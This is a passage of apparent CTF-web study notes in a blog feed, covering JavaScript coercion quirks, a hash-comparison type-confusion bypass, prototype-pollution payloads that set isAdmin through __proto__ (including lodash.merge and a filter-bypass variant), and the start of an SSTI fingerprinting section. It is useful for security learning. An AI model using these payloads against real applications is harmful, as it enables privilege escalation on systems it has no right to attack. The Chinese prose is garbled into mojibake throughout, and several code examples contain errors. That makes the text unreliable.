æ³•æ“ä½œç¬¦çš„ä½¿ç”¨ï¼š"><a href="#åŠ æ³•æ“ä½œç¬¦çš„ä½¿ç”¨ï¼š" class="headerlink" title="åŠ æ³•æ“ä½œç¬¦çš„ä½¿ç”¨ï¼š"></a>åŠ æ³•æ“ä½œç¬¦çš„ä½¿ç”¨ï¼š</h3><p>é™¤äº†number+numberå’Œboolå’Œboolå…¶ä½™è¿”å›string</p><ul><li><p><strong>æ•°å­—ä¸å­—ç¬¦ä¸²çš„æ‹¼æ¥</strong>ï¼š</p><ul><li>æ•°å­—åŠ æ•°å­—ï¼š<code>1 + 1 = 2</code></li><li>å­—ç¬¦ä¸²åŠ å­—ç¬¦ä¸²ï¼š<code>&quot;abc&quot; + &quot;def&quot; = &quot;abcdef&quot;</code></li><li>å­—ç¬¦ä¸²åŠ æ•°å­—ï¼š<code>&quot;abc&quot; + 1 = &quot;abc1&quot;</code></li><li>å­—ç¬¦ä¸²åŠ å¯¹è±¡:     â€œuertâ€+{person:â€™abcâ€™}&#x3D;uert{person:â€™abcâ€™}</li><li>å¯¹è±¡åŠ å¯¹è±¡ï¼š<code>[Object Object]</code> æ‹¼æ¥ç»“æœ</li><li>å­—ç¬¦ä¸²åŠ æ•°ç»„: â€œuertâ€+[â€œabcâ€,â€efgâ€]&#x3D;â€uertabcâ€,â€efgâ€</li><li>å­—ç¬¦ä¸²åŠ null: â€œuertâ€+null&#x3D; â€œuertnullâ€  åŒç†trueå’Œfalse</li></ul><p> Python é‡Œé¢ä¸èƒ½åƒ JS è¿™æ ·æ··åˆä¸åŒç±»å‹çš„æ•°æ®æ¥åšæ‹¼æ¥ï¼Œä½† JS æ˜¯å¯ä»¥çš„ã€‚</p></li><li><p><strong>å…¶ä»–è¿ç®—ç¬¦</strong>:</p><ul><li>fuc+fuc&#x3D;â€(a,b)&#x3D;&gt;{return(a+b)}(a,b)&#x3D;&gt;{return(a+b)}â€</li><li>arr+arr&#x3D;â€abc,efgabc,abcâ€</li><li>arr+true&#x3D; â€œabc,deftrueâ€</li></ul></li></ul><h3 id="éå­—ç¬¦ä¸²ä¸éå­—ç¬¦ä¸²çš„æ“ä½œï¼š"><a href="#éå­—ç¬¦ä¸²ä¸éå­—ç¬¦ä¸²çš„æ“ä½œï¼š" class="headerlink" title="éå­—ç¬¦ä¸²ä¸éå­—ç¬¦ä¸²çš„æ“ä½œï¼š"></a>éå­—ç¬¦ä¸²ä¸éå­—ç¬¦ä¸²çš„æ“ä½œï¼š</h3><ul><li><code>true + true = 2</code></li><li><code>false + false = 0</code></li></ul><h3 id="å‡½æ•°çš„ç®€å†™ï¼š"><a href="#å‡½æ•°çš„ç®€å†™ï¼š" class="headerlink" title="å‡½æ•°çš„ç®€å†™ï¼š"></a>å‡½æ•°çš„ç®€å†™ï¼š</h3><ul><li>ä½¿ç”¨ç®­å¤´å‡½æ•°ï¼š<code>(a, b) =&gt; &#123;return (a + b)&#125;</code> å’Œ <code>arr + true = abc.deftrue</code>ã€‚</li></ul><h3 id="é•¿åº¦å±æ€§ï¼š"><a href="#é•¿åº¦å±æ€§ï¼š" class="headerlink" title="é•¿åº¦å±æ€§ï¼š"></a>é•¿åº¦å±æ€§ï¼š</h3><ul><li><p><strong>String çš„é•¿åº¦</strong>:</p><ul><li><code>string.length</code> è¿”å›å­—ç¬¦ä¸²çš„å­—ç¬¦æ•°ã€‚</li></ul></li><li><p><strong>Array çš„é•¿åº¦</strong>:</p><ul><li><code>Array.length</code> è¿”å›æ•°ç»„çš„å…ƒç´ ä¸ªæ•°ã€‚</li></ul></li><li><p>è¿˜æåˆ° <code>number æ²¡æœ‰ length</code> å±æ€§ã€‚</p></li></ul><h3 id="JSON-è§£æï¼š"><a href="#JSON-è§£æï¼š" class="headerlink" title="JSON è§£æï¼š"></a>JSON è§£æï¼š</h3><ul><li>ä½¿ç”¨ <code>JSON.parse()</code> å¯ä»¥å°† JSON å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå¯¹è±¡ã€‚</li><li>æ³¨æ„åˆ°ä½ æåˆ° <code>JSON.parse(null)</code> ä¼šè¿”å› <code>null</code>ã€‚</li></ul><h3 id="å…¶ä»–ï¼š"><a href="#å…¶ä»–ï¼š" class="headerlink" title="å…¶ä»–ï¼š"></a>å…¶ä»–ï¼š</h3><ul><li>ä½¿ç”¨ <code>in</code> å¯ä»¥éå†å¯¹è±¡çš„å±æ€§ã€‚</li><li>åœ¨æœ€å³ä¾§æåˆ° <code>è¿™é‡ŒæŒ‡çš„æ˜¯æ•°å­—</code>ã€‚</li></ul><h1 id="js-trick"><a href="#js-trick" class="headerlink" title="js   trick"></a>js   trick</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">NaN==NaN</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">NaN==NaN</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash"><span class="hljs-literal">false</span>==<span class="hljs-string">&#x27;0&#x27;</span></span><br>&lt;ture<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0==<span class="hljs-string">&#x27;0&#x27;</span></span><br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0==<span class="hljs-literal">false</span></span><br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1e-1234 //æ•´æ•°çš„è´Ÿå¤§æ•°æ¬¡æ–¹ä¸º0</span><br>&lt;0<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">-1e-1234 //è´Ÿæ•°çš„è´Ÿå¤§æ•°æ¬¡æ–¹ä¸º-0</span><br>&lt;-0<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">0===-0</span><br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1337/0</span><br>&lt;æ— ç©·<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1337/-0</span><br>&lt;è´Ÿæ— ç©·<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">è´Ÿæ— ç©·==æ­£æ— ç©·</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">e=-1</span><br>&lt;-1<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">!e++</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">!e--</span><br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">!<span class="hljs-string">&#x27;0&#x27;</span>  //ä¾‹å­ f==!f  fæ˜¯<span class="hljs-string">&quot;0&quot;</span>å°±è¡Œ</span><br>&lt;false<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">!<span class="hljs-string">&#x27;&#x27;</span></span>   <br>&lt;true<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">a=[<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;hello&quot;</span>]</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">a[<span class="hljs-string">&quot;name&quot;</span>]</span><br>&lt;&#x27;hello&#x27;<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">a[[<span class="hljs-string">&quot;name&quot;</span>]]</span><br>&lt;&#x27;hello&#x27;<br></code></pre></td></tr></table></figure><h1 id="ç±»å‹æ±¡æŸ“"><a href="#ç±»å‹æ±¡æŸ“" class="headerlink" title="ç±»å‹æ±¡æŸ“"></a>ç±»å‹æ±¡æŸ“</h1><p>first !&#x3D;&#x3D; second &amp;&amp; shal(salt + frist) &#x3D;&#x3D;&#x3D; shal(salt + second)</p><p>POST : {â€œfristâ€ : â€œAâ€ â€œsecondâ€: [â€œAâ€]}</p><h1 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h1><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">Function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;...&#125;;<br>let f1 = <span class="hljs-keyword">new</span> Foo();<br>è§£é‡Šï¼š<br>æ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ª prototype å±æ€§ï¼ŒæŒ‡å‘ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡åŒ…å«è¯¥æ„é€ å‡½æ•°æ‰€æœ‰å®ä¾‹å…±äº«çš„æ–¹æ³•å’Œå±æ€§ã€‚<br>æ¯ä¸ªå¯¹è±¡æœ‰ä¸€ä¸ª __proto__ å±æ€§ï¼ŒæŒ‡å‘åˆ›å»ºè¯¥å¯¹è±¡çš„æ„é€ å‡½æ•°çš„ prototypeã€‚<br>let foo = &#123;<span class="hljs-attr">bar</span>:<span class="hljs-number">1</span>&#125;;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(foo.bar); <span class="hljs-comment">//1</span><br>foo.__proto__.bar=<span class="hljs-number">2</span>; <span class="hljs-comment">//æŠŠfooçš„åŸå‹object</span><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(foo.bar); <span class="hljs-comment">//è¿˜æ˜¯1</span><br>let zoo=&#123;&#125;;<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(zoo.bar); <span class="hljs-comment">//ç»“æœæ˜¯&#123;&#125;è€Œä¸æ˜¯2</span><br>æˆ‘.uert=å¼ ä¸‰<br>é™¤éæˆ‘é‡Œé¢æ²¡æœ‰å¼ ä¸‰,æ‰æ˜¯å¼ é“æŸ±<br>è¯¥çˆ¹æ³•<br>val.__proto__.isAdmin = <span class="hljs-literal">true</span><br>æ¢çˆ¹æ³•<br>val.__proto__=&#123;<span class="hljs-string">&#x27;isAdmin&#x27;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¸¾ä¾‹è¯´æ˜ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-keyword">let</span> john = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;John&quot;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(john.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br>john.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// &quot;Hello, John&quot;</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š</p><ul><li><code>john</code> æ˜¯é€šè¿‡ <code>new Person()</code> åˆ›å»ºçš„å¯¹è±¡ã€‚</li><li><code>john.__proto__</code> æŒ‡å‘ <code>Person.prototype</code>ï¼Œå®ƒåŒ…å« <code>sayHello</code> æ–¹æ³•ã€‚</li><li>å½“ä½ è°ƒç”¨ <code>john.sayHello()</code> æ—¶ï¼ŒJavaScript å¼•æ“ä¼šæ²¿ç€ <code>__proto__</code> æŸ¥æ‰¾è¿™ä¸ªæ–¹æ³•ï¼Œæœ€ç»ˆåœ¨ <code>Person.prototype</code> ä¸Šæ‰¾åˆ°å¹¶æ‰§è¡Œã€‚</li></ul><h1 id="åŸå‹é“¾å›¾è§£"><a href="#åŸå‹é“¾å›¾è§£" class="headerlink" title="åŸå‹é“¾å›¾è§£"></a>åŸå‹é“¾å›¾è§£</h1><h3 id="JavaScript-åŸå‹é“¾çš„æ ¸å¿ƒæ¦‚å¿µï¼š"><a href="#JavaScript-åŸå‹é“¾çš„æ ¸å¿ƒæ¦‚å¿µï¼š" class="headerlink" title="JavaScript åŸå‹é“¾çš„æ ¸å¿ƒæ¦‚å¿µï¼š"></a>JavaScript åŸå‹é“¾çš„æ ¸å¿ƒæ¦‚å¿µï¼š</h3><ol><li><strong>æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªéšå¼åŸå‹ï¼ˆ<code>__proto__</code>ï¼‰</strong>ï¼š<ul><li>å½“ä½ åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œè¯¥å¯¹è±¡ä¼šæœ‰ä¸€ä¸ªéšå¼åŸå‹æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„ <code>prototype</code> å±æ€§ã€‚</li></ul></li><li><strong>æ„é€ å‡½æ•°ä¸ <code>prototype</code> å±æ€§</strong>ï¼š<ul><li>æ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ªæ˜¾å¼åŸå‹å±æ€§ï¼ˆ<code>prototype</code>ï¼‰ï¼Œè¿™ä¸ªå±æ€§æŒ‡å‘é€šè¿‡è¿™ä¸ªæ„é€ å‡½æ•°åˆ›å»ºçš„å®ä¾‹å¯¹è±¡çš„åŸå‹ã€‚</li></ul></li><li>**å¯¹è±¡çš„ <code>__proto__</code> æŒ‡å‘æ„é€ å‡½æ•°çš„ <code>prototype</code>**ï¼š<ul><li>ä¾‹å¦‚ï¼Œ<code>let obj = new Foo();</code> ä¸­ï¼Œ<code>obj.__proto__ === Foo.prototype</code>ã€‚å³ <code>obj</code> çš„åŸå‹æŒ‡å‘äº† <code>Foo</code> æ„é€ å‡½æ•°çš„ <code>prototype</code>ã€‚</li></ul></li><li><strong>æ„é€ å‡½æ•°æœ¬èº«ä¹Ÿæ˜¯å¯¹è±¡</strong>ï¼š<ul><li>æ‰€ä»¥æ„é€ å‡½æ•° <code>Foo</code> ä¹Ÿæ˜¯ç”± <code>Function</code> æ„é€ å‡ºæ¥çš„ï¼Œå®ƒæœ‰ä¸€ä¸ª <code>__proto__</code>ï¼ŒæŒ‡å‘ <code>Function.prototype</code>ã€‚</li></ul></li><li>**ç»ˆç‚¹æ˜¯ <code>null</code>**ï¼š<ul><li>åŸå‹é“¾çš„ç»ˆç‚¹æ˜¯ <code>null</code>ï¼Œå³ <code>Object.prototype.__proto__ === null</code>ã€‚</li></ul></li></ol><h3 id="æ›´è¯¦ç»†çš„å›¾å½¢è¯´æ˜ï¼š"><a href="#æ›´è¯¦ç»†çš„å›¾å½¢è¯´æ˜ï¼š" class="headerlink" title="æ›´è¯¦ç»†çš„å›¾å½¢è¯´æ˜ï¼š"></a>æ›´è¯¦ç»†çš„å›¾å½¢è¯´æ˜ï¼š</h3><ul><li><strong>Foo å¯¹è±¡å®ä¾‹</strong>ï¼š<ul><li><code>foo.__proto__ -&gt; Foo.prototype</code></li></ul></li><li><strong>Foo æ„é€ å‡½æ•°</strong>ï¼š<ul><li><code>Foo.__proto__ -&gt; Function.prototype</code></li></ul></li><li><strong>Function æ„é€ å‡½æ•°</strong>ï¼š<ul><li><code>Function.__proto__ -&gt; Function.prototype</code></li><li><code>Function.prototype.__proto__ -&gt; Object.prototype</code></li></ul></li><li><strong>Object æ„é€ å‡½æ•°</strong>ï¼š<ul><li><code>Object.__proto__ -&gt; Function.prototype</code></li><li><code>Object.prototype.__proto__ -&gt; null</code></li></ul></li></ul><p>è¿™ä¸ªå±‚æ¬¡ç»“æ„å¯ä»¥è¿™æ ·çœ‹ï¼š</p><ul><li><strong>Foo çš„å®ä¾‹</strong>ï¼šç»§æ‰¿è‡ª <code>Foo.prototype</code></li><li><strong>Foo.prototype</strong>ï¼šç»§æ‰¿è‡ª <code>Object.prototype</code></li><li><strong>Fooï¼ˆæ„é€ å‡½æ•°æœ¬èº«ï¼‰</strong>ï¼šç»§æ‰¿è‡ª <code>Function.prototype</code></li><li><strong>Function.prototype</strong>ï¼šç»§æ‰¿è‡ª <code>Object.prototype</code></li><li><strong>Object.prototype</strong>ï¼šç»§æ‰¿è‡ª <code>null</code>ï¼ŒåŸå‹é“¾ç»“æŸã€‚</li></ul><h1 id="ç»éªŒ"><a href="#ç»éªŒ" class="headerlink" title="ç»éªŒ"></a>ç»éªŒ</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">1.</span>obj1[xx]= obj2[yy] æ¢çˆ¹    æ³¨é‡Š: è¿™ç§å†™æ³•æ˜¯ä¸€ç§åŠ¨æ€å±æ€§èµ‹å€¼æ–¹å¼ã€‚å®ƒçš„æ„æ€æ˜¯ï¼Œå°† obj2 å¯¹è±¡ä¸­é”®ä¸º yy çš„å€¼èµ‹ç»™ obj1 å¯¹è±¡ä¸­é”®ä¸º xx çš„å±æ€§ã€‚<br><br><span class="hljs-keyword">let</span> obj1 = &#123;&#125;;<br><span class="hljs-keyword">let</span> obj2 = &#123;<br>  <span class="hljs-attr">key1</span>: &#123; <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">true</span> &#125;,<br>  <span class="hljs-attr">key2</span>: <span class="hljs-string">&quot;value2&quot;</span><br>&#125;;<br><br><span class="hljs-comment">// åŠ¨æ€èµ‹å€¼çš„å˜é‡</span><br><span class="hljs-keyword">let</span> xx = <span class="hljs-string">&quot;__proto__&quot;</span>; <span class="hljs-comment">// è®¾ç½®ä¸º &quot;__proto__&quot; æ¥ä¿®æ”¹åŸå‹é“¾</span><br><span class="hljs-keyword">let</span> yy = <span class="hljs-string">&quot;key1&quot;</span>; <span class="hljs-comment">// ä» obj2 ä¸­è·å–é”®ä¸º key1 çš„å€¼</span><br><br><span class="hljs-comment">// é€šè¿‡åŸå‹é“¾æ±¡æŸ“å°† obj2[key1] çš„å€¼èµ‹ç»™ obj1.__proto__</span><br>obj1[xx] = obj2[yy];<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj1.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true, é€šè¿‡åŸå‹é“¾æ±¡æŸ“ï¼Œobj1 è·å¾—äº† isAdmin å±æ€§</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true, æ‰€æœ‰å¯¹è±¡éƒ½è¢«æ±¡æŸ“äº†</span><br><br><br><span class="hljs-number">2.</span>obj[xx][yy]=zz æ”¹çˆ¹**   åœ¨ obj[xx] è¿”å›çš„ç»“æœï¼ˆå‡è®¾æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼‰ä¸Šï¼Œå†é€šè¿‡ yy åŠ¨æ€è®¿é—®å…¶å±æ€§ã€‚<br><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªç©ºå¯¹è±¡ obj</span><br><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br><br><span class="hljs-comment">// è®¾ç½®åŠ¨æ€å˜é‡</span><br><span class="hljs-keyword">let</span> xx = <span class="hljs-string">&quot;__proto__&quot;</span>;  <span class="hljs-comment">// ç”¨æ¥ä¿®æ”¹å¯¹è±¡çš„åŸå‹é“¾</span><br><span class="hljs-keyword">let</span> yy = <span class="hljs-string">&quot;isAdmin&quot;</span>;    <span class="hljs-comment">// æˆ‘ä»¬è¦åœ¨åŸå‹é“¾ä¸Šæ·»åŠ çš„å±æ€§</span><br><span class="hljs-keyword">let</span> zz = <span class="hljs-literal">true</span>;         <span class="hljs-comment">// è¦èµ‹çš„å€¼</span><br><br><span class="hljs-comment">// ä½¿ç”¨ obj[xx][yy] = zz æ”¹çˆ¹æ³•ä¿®æ”¹åŸå‹é“¾</span><br>obj[xx][yy] = zz;<br><br><span class="hljs-comment">// ç°åœ¨ä»»ä½•é€šè¿‡ Object åˆ›å»ºçš„å¯¹è±¡éƒ½ç»§æ‰¿äº† isAdmin å±æ€§</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">isAdmin</span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-property">isAdmin</span>);  <span class="hljs-comment">// true, æ‰€æœ‰æ–°å¯¹è±¡ä¹Ÿè¢«æ±¡æŸ“äº†</span><br>+<br><br><br> <span class="hljs-number">2.</span><span class="hljs-title function_">merge</span>() å‡½æ•°çš„åŸå‹é“¾æ±¡æŸ“<br><span class="hljs-keyword">let</span> maliciousPayload = &#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;polluted&quot;</span>: <span class="hljs-string">&quot;malicious value&quot;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br><span class="hljs-title function_">merge</span>(obj, maliciousPayload);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">polluted</span>);  <span class="hljs-comment">// è¾“å‡º &quot;malicious value&quot;</span><br><br><br><br><span class="hljs-number">4.</span>lodash.<span class="hljs-title function_">merge</span>() çš„åŸå‹é“¾æ±¡æŸ“<br><span class="hljs-keyword">const</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br><span class="hljs-keyword">let</span> maliciousPayload = &#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;polluted&quot;</span>: <span class="hljs-string">&quot;malicious value&quot;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>_.<span class="hljs-title function_">merge</span>(obj, maliciousPayload);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">polluted</span>);  <span class="hljs-comment">// è¾“å‡º &quot;malicious value&quot;</span><br><br><br><span class="hljs-number">5.</span> <span class="hljs-title function_">set</span>() å’Œ <span class="hljs-title function_">update</span>()<br><span class="hljs-keyword">let</span> maliciousPayload = &#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;polluted&quot;</span>: <span class="hljs-string">&quot;malicious value&quot;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// å‡è®¾æœ‰ä¸ªæ·±åº¦æ›´æ–°çš„åº“å‡½æ•° `set`</span><br><span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;key&#x27;</span>, maliciousPayload);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">polluted</span>);  <span class="hljs-comment">// è¾“å‡º &quot;malicious value&quot;</span><br><br><br></code></pre></td></tr></table></figure><p>your[req.body.key] &#x3D; req.body.value</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua">&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&#x27;__proto__&#x27;</span>,<span class="hljs-string">&quot;value&quot;</span>:&#123;<span class="hljs-string">&quot;isAdmin&quot;</span>:<span class="hljs-number">1</span>&#125;&#125;<br>å¯¹key__proto__è¿‡æ»¤ä¼ &#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">[[&#x27;__proto__&#x27;]]</span>&#125;è¯•è¯•<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI</title>
    <link href="/2024/09/01/SSTI/"/>
    <url>/2024/09/01/SSTI/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a><code>SSTI</code></h1><p><code>$&#123;7*7&#125;</code></p><ul><li><code>y a&#123;*comment*&#125;b</code><ul><li><code>y Smarty</code></li><li><code>n $&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125; -&gt; Mako</code></li><li><code>n &#123;&#123;7*7&#125;&#125;</code><ul><li><code>y &#123;&#123;7*'7'&#125;&#125; -&gt; jinja2 Twig</code></li><li><code>n</code></li></ul></li></ul></li></ul><h1 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a><code>Flask</code></h1><h2 id="å†…ç½®æ–¹æ³•"><a href="#å†…ç½®æ–¹æ³•" class="headerlink" title="å†…ç½®æ–¹æ³•"></a><code>å†…ç½®æ–¹æ³•</code></h2><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs leaf">- __class__: è¿”å›å½“å‰å¯¹è±¡æ‰€å±çš„ç±»ã€‚ä¾‹ï¼š&quot;&quot;.__class__  <span class="hljs-punctuation">#</span> &lt;class &#x27;str&#x27;&gt;<br>- __bases__: ä»¥å…ƒç»„çš„å½¢å¼è¿”å›è¯¥ç±»çš„ç›´æ¥çˆ¶ç±»ã€‚ä¾‹ï¼š&quot;&quot;.__class__.__bases__ <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-operator">&lt;</span><span class="hljs-variable">class</span> &#x27;<span class="hljs-variable">object</span>&#x27;<span class="hljs-operator">&gt;</span>,)</span><br>- __base__: ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›è¯¥ç±»çš„åŸºç±»(Object)ã€‚ä¾‹ï¼š&quot;&quot;.__class__.__base__ <span class="hljs-punctuation">#</span>&lt;class &#x27;object&#x27;&gt;<br>- __mro__: ä»¥å…ƒç»„çš„å½¢å¼è¿”å›è§£ææ–¹æ³•çš„è°ƒç”¨é¡ºåºã€‚ä¾‹ï¼š&quot;&quot;.__class__.__mro__ <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-operator">&lt;</span><span class="hljs-variable">class</span> &#x27;<span class="hljs-variable">str</span>&#x27;<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-variable">class</span> &#x27;<span 